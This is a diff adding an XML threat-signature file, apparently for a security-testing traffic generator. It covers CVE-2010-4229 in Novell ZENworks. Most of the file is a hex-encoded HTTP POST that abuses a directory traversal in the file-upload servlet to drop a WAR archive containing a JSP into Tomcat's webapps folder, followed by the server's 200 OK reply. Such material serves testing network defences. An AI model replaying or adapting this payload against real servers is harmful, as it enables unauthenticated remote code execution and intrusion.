@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Novell ZENworks Asset Management File Upload Directory Traversal"/>
+    <EngDesc display="true" value="A directory traversal vulnerability exists in Novell ZENworks Configuration Management. The vulnerability is due to insufficient input validation within the ZENworks Server's FileUploadServlet. Remote unauthenticated attackers can leverage this vulnerability to upload malicious files anywhere onto the target server.            Successful exploitation of this vulnerability allows an attacker to execute arbitrary code on the vulnerable system with the privileges of the Administrator user. In this case, the behaviour of the target machine is dependent on the logic of the malicious code.&#13;&#10;A directory traversal vulnerability exists in Novell ZENworks Configuration Management. The vulnerability is due to insufficient input validation within the ZENworks Server's FileUploadServlet. Remote unauthenticated attackers can leverage this vulnerability to upload malicious files anywhere onto the target server.            Successful exploitation of this vulnerability allows an attacker to execute arbitrary code on the vulnerable system with the privileges of the Administrator user. In this case, the behaviour of the target machine is dependent on the logic of the malicious code.&#13;&#10;A directory traversal vulnerability exists in Novell ZENworks Configuration Management. The vulnerability is due to insufficient input validation within the ZENworks Server's FileUploadServlet. Remote unauthenticated attackers can leverage this vulnerability to upload malicious files anywhere onto the target server.            Successful exploitation of this vulnerability allows an attacker to execute arbitrary code on the vulnerable system with the privileges of the Administrator user. In this case, the behaviour of the target machine is dependent on the logic of the malicious code.&#13;&#10;"/>
+    <Intent display="true">
+      <item value="Code_Execution"/>
+    </Intent>
+    <Protocol display="true" value="HTTP,HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Novell"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="ZENworks_Configuration_Management"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="prior_to_10.3.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20110411-03"/>
+    <CVEID display="true" value="CVE-2010-4229"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Jim"/>
+    <ID display="true" value="0a5b42d34860dd3518bfb6ba978bd281"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="network"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634444414342428343"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1309167030" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="srcIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+    <for index="C">
+      <for index="E"/>
+      <for index="D"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:60:8C:AF" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="05DC" Identification="5758" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="7BB7" srcIP="$srcIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="34705" destPort="$HTTPdestPort" SeqNumber="B25BFBFD" AckNumber="512C151C" HeaderLength="08" WindowSize="002E" Checksum="36B1" UrgentPointer="0000" Options="0101080AD11BACAA00000000" Payload="504F5354202F7A656E776F726B732D66696C6575706C6F61642F3F66696C656E616D653D706F632E77617226747970653D2F2E2E2F2E2E2F73686172652F746F6D6361742F77656261707073266F76657277726974653D7472756520485454502F312E310D0A486F73743A203137322E31362E382E3233343A38300D0A436F6E74656E742D547970653A206170706C69636174696F6E2F6F637465742D73747265616D0D0A436F6E74656E742D4C656E6774683A20313635300D0A0D0A504B0304140000000800C5517A3BBA296DAB25010000F901000007000000706F632E6A73706D914D6B02311086CF0AFE876940D86DCB2E5EFDA23D2814A4056D6F5E6276D64D89C9928C5F88FFBDC9A60B0AE692C03BCF3343665CD14E4D7BDD7185BC0837495238FD9E2D7E56B042B1B792CEB0E01B37CE63E46BF2B678638AB3BF033E78C4BCC2BB52B094DB8A1C2CD1A13D60E1F14180FB6F35DF22C85D6D2C4DD82F3FF04C9AEC99F59BB4D785E6CCA5422847BD6E87EC192EE01F3128271A8F4D9C3031CC6B23323A114B472DD99165F2546678928E5C92A6178FB66C262C72C24F3C368200B599D953565BA949E984F90228C304EB9B1E6B061577B041D4103DC56DDB6B70A172084DC7CE9D70FE401627647188405F4170121524F0F1353B09AC491A0D9846E19D6FA685D96B428B05A0B5C60E81C18BAF0D32EFEAC7FDE4FFABF29F1F17FE07504B03040A000000000033517A3B000000000000000000000000090000004D4554412D494E462F504B03041400000008004582FE36E2FA02BE5E0000006A000000140000004D4554412D494E462F4D414E49464553542E4D46F34DCCCB4C4B2D2ED10D4B2D2ACECCCFB35230D433E0E572CC4312712C484CCE4855008A0125CDF44C79B99C8B52134B5253749D2A41EA4DF50CE20DCC74930C4C1534824BF3147C33938BF28B2B8B4B52738B153CF392F53479B978B900504B03040A000000000033517A3B000000000000000000000000080000005745422D494E462F504B03040A000000000033517A3B000000000000000000000000100000005745422D494E462F636C61737365732F504B03040A000000000033517A3B0000000000000000000000000C0000005745422D494E462F6C69622F504B0304140000000800F3517A3B6D62073021010000E50100000F0000005745422D494E462F7765622E786D6C85514D6B0231103D57F03F0CB927D1D582CAAA07F150D862616DE94D628C6E6437093BD1D57FDFA95FE0C9904BE6CD9BF7DE249D9EAA128EA646EBDD987545878171DA6FACDB8DD947BEE083C1FB9077D974D26EA58D5973150210C7E19815318691947B7554020F4E685F4982A443B94F8C61ED16D0B9348F4E681F84A66944D313BEDEC9A4D3E9CADFCF2CD785A914B70EA372FA41453BC20B9279ADE2C5E20B517881CB5B8655B2EA8B136E6E4A8F0D24A2CF28EAB59A6E2C86529DB95395992CE7D9770EB9D187DAC633646A8DC0E1ABF67E0B8B2DCC3C190F31954FA4FB2083BAB6E13F0295DE968545A0AB006D154A03E40AC85569AF31217AB06579C058AB68201606A84FE908A435FB9973DADB90F706FDDE6DBE7C16A0BFBA07A5D71F504B0304140000000800CF6E533C1BB52E0396000000DD0000000A000000696E6465782E68746D6C6D8F3D0E83300C46F74ABD83C50188BA566996AA1B1BF40026189262084A5C55DCBEFC75EB64C9DF7BB23FED6460733E6947D8AC53BC3099EA513C4B28C9BEA397190AAC93567BB430EA8057EDF29F5DF65B3E993B7BDB4318411C411B98C3C78F1DB01F7B900036120A0142EB997E9860EC4820CD4968B882467091DA5B36059BBFD29499C35A1DADD0E4DB2D558766DEFFDB4B7D01504B01021400140000000800C5517A3BBA296DAB25010000F9010000070000000000000001002000000000000000706F632E6A7370504B010214000A000000000033517A3B00000000000000000000000009000000000000000000100000004A0100004D4554412D494E462F504B010214001400000008004582FE36E2FA02BE5E0000006A0000001400000000000000010020000000710100004D4554412D494E462F4D414E49464553542E4D46504B010214000A000000000033517A3B0000000000000000000000000800000000000000000010000000010200005745422D494E462F504B010214000A000000000033517A3B0000000000000000000000001000000000000000000010000000270200005745422D494E462F636C61737365732F504B010214000A000000000033517A3B0000000000000000000000000C00000000000000000010000000550200005745422D494E462F6C69622F504B01021400140000000800F3517A3B6D62073021010000E50100000F000000000000000100200000007F0200005745422D494E462F7765622E786D6C504B01021400140000000800CF6E533C1BB52E0396000000DD0000000A00000000000000010080000000CD030000696E6465782E68746D6C504B05060000000008000800D10100008B0400000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="C" Count="">
+      <Ethernet srcMac="00:0C:29:60:8C:AF" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00A8" Identification="4ECE" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="4975" srcIP="$destIP" destIP="$srcIP" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="34705" SeqNumber="512C151C" AckNumber="B25C032C" HeaderLength="08" WindowSize="FAF0" Checksum="D096" UrgentPointer="0000" Options="0101080A00177389D11BACAA" Payload="485454502F312E3120323030204F4B0D0A5365727665723A204170616368652D436F796F74652F312E310D0A5472616E736665722D456E636F64696E673A206368756E6B65640D0A446174653A204672692C203237204D617920323031312030323A32383A343020474D540D0A0D0A300D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
